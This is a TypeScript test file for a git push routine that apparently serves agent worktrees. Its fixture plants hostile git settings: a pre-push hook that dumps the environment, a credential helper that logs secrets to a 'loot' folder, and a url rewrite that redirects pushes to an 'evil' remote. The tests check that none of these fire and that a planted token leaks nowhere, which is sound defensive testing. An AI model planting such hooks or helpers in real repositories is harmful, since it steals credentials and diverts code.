import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { experimental_createHostEntryHarness } from "@get-bb/plugin-sdk/testing/host";
import entry from "./host.ts";

const TOKEN = "ghs_PLANTED_SECRET_TOKEN";
const BRANCH = "agent/issue-41-submit-button";

function sh(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.com", GIT_CONFIG_GLOBAL: "/dev/null" },
  }).trim();
}

function commit(cwd: string, file: string, text: string): string {
  writeFileSync(join(cwd, file), text);
  sh(cwd, "add", file);
  sh(cwd, "commit", "-q", "-m", `edit ${file}`);
  return sh(cwd, "rev-parse", "HEAD");
}

/** Every file under `dir` whose bytes contain `needle`. */
function filesContaining(dir: string, needle: string): string[] {
  return readdirSync(dir, { recursive: true, encoding: "utf8" })
    .map((name) => join(dir, name))
    .filter((path) => statSync(path).isFile() && readFileSync(path).includes(needle));
}

/**
 * A main checkout with a linked worktree (as bb's managed worktrees are), a bare remote reached over file://, and a
 * worker that planted a url rewrite to another remote, a hooks path with a pre-push hook that dumps its environment,
 * and a credential helper that logs what it is given.
 */
function fixture() {
  const root = mkdtempSync(join(tmpdir(), "pstack-host-"));
  const remote = join(root, "remote.git");
  const evil = join(root, "evil.git");
  const main = join(root, "main");
  const worktree = join(root, "worktree");
  const temp = join(root, "temp");
  const loot = join(root, "loot");
  for (const dir of [main, temp, loot]) mkdirSync(dir);
  sh(root, "init", "--bare", "-q", remote);
  sh(root, "init", "--bare", "-q", evil);
  sh(main, "init", "-q", "-b", "main");
  commit(main, "README.md", "hello\n");
  sh(main, "worktree", "add", "-q", "-b", "bb/thread-branch", worktree);

  const hooks = join(root, "hooks");
  mkdirSync(hooks);
  writeFileSync(join(hooks, "pre-push"), `#!/bin/sh\nenv > ${join(loot, "pre-push-env")}\n`);
  chmodSync(join(hooks, "pre-push"), 0o755);
  sh(worktree, "config", "core.hooksPath", hooks);
  sh(worktree, "config", `url.file://${evil}.insteadOf`, `file://${remote}`);
  sh(worktree, "config", "credential.helper", `!f() { cat >> ${join(loot, "credential")}; env >> ${join(loot, "credential")}; }; f`);

  const harness = experimental_createHostEntryHarness(entry, { experimental_paths: { dataDir: join(root, "data"), tempDir: temp } });
  const push = (sha: string, expectedRemoteSha: string | null, branch = BRANCH) =>
    harness.experimental_call("push", { worktreePath: worktree, remoteUrl: `file://${remote}`, branch, sha, expectedRemoteSha, token: TOKEN });
  const remoteHead = () => {
    try {
      return sh(root, "--git-dir", remote, "rev-parse", `refs/heads/${BRANCH}`);
    } catch {
      return null;
    }
  };
  return { root, remote, evil, worktree, temp, loot, push, remoteHead, harness };
}

test("push sends the reported commit from a scratch repository the worktree's config and hooks never touch", async () => {
  const f = fixture();
  const first = commit(f.worktree, "a.txt", "one\n");
  assert.deepEqual(await f.push(first, null), { status: "pushed", sha: first });
  assert.equal(f.remoteHead(), first);

  assert.equal(sh(f.root, "--git-dir", f.evil, "for-each-ref").trim(), "", "the planted insteadOf did not redirect the push");
  assert.deepEqual(readdirSync(f.loot), [], "the planted pre-push hook and credential helper never ran");
  assert.deepEqual(filesContaining(f.root, TOKEN), [], "the token was written nowhere");
  assert.deepEqual(readdirSync(f.temp), [], "the scratch repository is removed");

  const later = commit(f.worktree, "b.txt", "two\n");
  commit(f.worktree, "c.txt", "not reported yet\n");
  assert.deepEqual(await f.push(later, first), { status: "pushed", sha: later });
  assert.equal(f.remoteHead(), later, "the reported commit is pushed, not HEAD");
  await f.harness.experimental_dispose();
});

test("push never rewrites the remote branch", async () => {
  const f = fixture();
  const first = commit(f.worktree, "a.txt", "one\n");
  assert.equal((await f.push(first, null)).status, "pushed");

  sh(f.worktree, "checkout", "-q", "--detach", "HEAD~1");
  const sibling = commit(f.worktree, "z.txt", "rewrite\n");
  assert.deepEqual(await f.push(sibling, first), {
    status: "rejected",
    reason: "not-descendant",
    detail: `${sibling} does not descend from the pushed ${first}`,
  });

  const second = commit(f.worktree, "y.txt", "on top\n");
  const stale = await f.push(second, null);
  assert.equal(stale.status === "rejected" && stale.reason, "stale-remote", "a branch that already exists is not overwritten when none was expected");
  assert.equal(f.remoteHead(), first);

  const missing = await f.push("f".repeat(40), null);
  assert.equal(missing.status === "rejected" && missing.reason, "missing-commit");
  await f.harness.experimental_dispose();
});

test("the contract admits only agent branches and full commit ids", async () => {
  const f = fixture();
  const sha = commit(f.worktree, "a.txt", "one\n");
  await assert.rejects(f.push(sha, null, "main"));
  await assert.rejects(f.push("HEAD", null));
  assert.equal(f.remoteHead(), null);
  assert.equal(existsSync(join(f.loot, "pre-push-env")), false);
  await f.harness.experimental_dispose();
});
